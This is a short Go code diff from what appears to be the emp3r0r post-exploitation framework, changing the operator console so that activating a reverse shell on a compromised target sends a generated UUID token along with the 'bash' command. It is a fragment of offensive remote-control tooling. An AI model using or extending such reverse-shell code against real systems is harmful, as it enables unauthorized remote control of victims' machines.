@@ -10,6 +10,7 @@ import (
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
 	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
 )
@@ -212,7 +213,10 @@ shell:
 
 		case input == "bash":
 			// activate reverse shell in agent
-			err := SendCmd("bash", CurrentTarget)
+			token := uuid.New().String()
+			RShellStream.Text = token
+			cmd := fmt.Sprintf("bash %s", token)
+			err := SendCmd(cmd, CurrentTarget)
 			if err != nil {
 				CliPrintError("Cannot activate reverse shell on remote target: ", err)
 				return
